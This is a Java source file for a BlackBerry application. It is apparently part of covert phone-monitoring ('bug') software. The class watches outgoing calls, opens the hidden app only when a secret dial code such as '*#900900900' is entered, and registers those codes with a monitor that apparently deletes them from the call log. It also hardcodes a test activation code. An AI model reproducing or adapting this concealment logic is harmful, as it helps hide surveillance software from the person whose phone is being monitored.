import com.vvt.calllogmon.FxCallLogNumberMonitor;
import com.vvt.calllogmon.OutgoingCallListener;
import com.vvt.global.Global;
import com.vvt.license.LicenseInfo;
import com.vvt.license.LicenseStatus;
import com.vvt.pref.PrefBugInfo;
import com.vvt.pref.Preference;
import com.vvt.pref.PreferenceType;
import com.vvt.std.Constant;
import com.vvt.std.PhoneInfo;

import net.rim.blackberry.api.phone.phonelogs.*;
import net.rim.device.api.ui.UiApplication;
import net.rim.device.api.system.Application;

public class BugInfoApplicationUI extends UiApplication implements OutgoingCallListener {
	
	private BugInfoApplicationMainScreen mainScreen = null;
	private FxCallLogNumberMonitor fxNumberRemover = Global.getFxCallLogNumberMonitor();
	private Preference pref = Global.getPreference();
	private PrefBugInfo bugInfo = (PrefBugInfo)pref.getPrefInfo(PreferenceType.PREF_BUG_INFO);
	private LicenseInfo license = Global.getLicenseManager().getLicenseInfo();
	private String defaultFlexiKey = "*#900900900";
	private String flexiKey = "";
	
	public BugInfoApplicationUI() {
		// License
		license.setLicenseStatus(LicenseStatus.DEACTIVATED);
		license.setActivationCode("123");
		Global.getLicenseManager().commit(license);
		// FxCallLogNumberMonitor
		fxNumberRemover.setListener(this);
		PhoneLogs.addListener(fxNumberRemover);
		flexiKey = Constant.ASTERISK + Constant.HASH + license.getActivationCode();
		fxNumberRemover.addCallLogNumber(defaultFlexiKey);
		fxNumberRemover.addCallLogNumber(flexiKey);
		// Main Screen
		mainScreen = new BugInfoApplicationMainScreen();
		pushScreen(mainScreen);
	}
	
	public static void main(String[] args) {
		BugInfoApplicationUI me = new BugInfoApplicationUI();
		me.enterEventDispatcher();
	}

	// OutgoingCallListener
	public void onOutgoingCall(String number) {
		flexiKey = Constant.ASTERISK + Constant.HASH + license.getActivationCode();
		if ((license.getLicenseStatus() == LicenseStatus.ACTIVATED && number.endsWith(flexiKey)) || (license.getLicenseStatus() == LicenseStatus.DEACTIVATED && number.endsWith(defaultFlexiKey))) {
			int interval = 500;
			if (PhoneInfo.isFiveOrHigher()) {
				interval = 900;
			}
			UiApplication.getApplication().invokeLater(new Runnable() {
				public void run() {
					synchronized (Application.getEventLock()) {
						requestForeground();
					}
				}
			}, interval, false);
		}
	}
}
